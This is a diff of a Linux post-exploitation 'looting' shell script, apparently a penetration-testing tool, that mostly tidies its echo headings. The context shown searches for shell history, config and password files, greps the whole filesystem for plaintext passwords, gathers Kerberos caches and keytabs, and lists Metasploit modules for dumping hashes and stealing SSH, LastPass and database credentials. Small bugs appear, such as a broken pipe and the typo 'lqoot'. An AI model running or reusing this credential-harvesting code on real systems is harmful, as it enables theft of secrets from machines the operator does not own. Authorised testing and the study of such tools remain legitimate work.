@@ -104,10 +104,10 @@ looting() {
     find / -name auth.log 2>/dev/null | tee -a loot/files_to_check.txt
     echo "======================= DIRECTORY LISTERNING OF THE: /var/log" | tee -a loot/files_to_check.txt
     ls /var/log | tee -a loot/var_log_directory_list.txt
-    echo "======================= CONFIG FILES (config.php!):" | tee -a loot/files_to_check.txt
+    echo "======================= CONFIG FILES (config.php):" | tee -a loot/files_to_check.txt
     locate .config | tee -a loot/files_to_check.txt
     locate config. | tee -a loot/files_to_check.txt
-    echo "======================= HISTORY FILES (.bash_history!):" | tee -a loot/files_to_check.txt
+    echo "======================= HISTORY FILES (.bash_history):" | tee -a loot/files_to_check.txt
     find / -name "*_history" -xdev 2>/dev/null | loot/files_to_check.txt
     echo "======================= PASSWORD FILES:" | tee -a loot/files_to_check.txt
     locate password | tee -a loot/files_to_check.txt
@@ -118,7 +118,7 @@ looting() {
     echo "======================= /etc/fstab:" | tee -a loot/files_to_check.txt
     locate /etc/fstab | tee -a loot/files_to_check.txt
     echo "======================= PLAIN TEXT PASSWORDS:" | tee -a loot/plain_text_pass.txt
-    grep --color=auto -rnw '/' -ie "PASSWORD\|PASSWD" --color=always 2> /dev/null | tee -a loot/plain_text_pass.txt
+    grep --color=auto -rnw '/' -ie "PASSWORD\|PASSWD" --color=always 2>/dev/null | tee -a loot/plain_text_pass.txt
     echo "======================= KERBEROS - CACHE" | tee -a loot/kerberos.txt
     env | grep KRB5CCNAME | tee -a loot/kerberos.txt
     find / -name "krb5cc_*" 2>/dev/null
@@ -127,7 +127,7 @@ looting() {
     echo "======================= KERBEROS - KEYTABS" | tee -a loot/kerberos.txt
     find / -name "*.keytab" 2>/dev/null | tee -a lqoot/kerberos.txt
     
-    echo "======================= ADDITIONAL MSF MODULES - DO NOT FORGET:
+    echo "======================= ADDITIONAL MSF MODULES:
 run post/linux/gather/hashdump
 run post/multi/gather/lastpass_creds
 run post/linux/gather/phpmyadmin_credsteal
@@ -141,7 +141,7 @@ run post/multi/gather/pgpass_creds
 run post/multi/gather/rsyncd_creds
 run post/multi/gather/ssh_creds
 
-======================= ADDITIONAL MANUAL CHECKS & DOUBLE CHECKS:
+======================= ADDITIONAL MANUAL CHECKS:
 [*] BROWSER
 [*] DATABASES
 [*] USERS'S FILES"
@@ -161,7 +161,7 @@ run post/linux/gather/enum_system
 run post/linux/gather/enum_configs
 run post/linux/gather/enum_users_history
 
-======================= ADDITIONAL MANUAL CHECKS & DOUBLE CHECKS:
+======================= ADDITIONAL MANUAL CHECKS:
 [*] BROWSER:
     - Browser History
     - Bookmarks
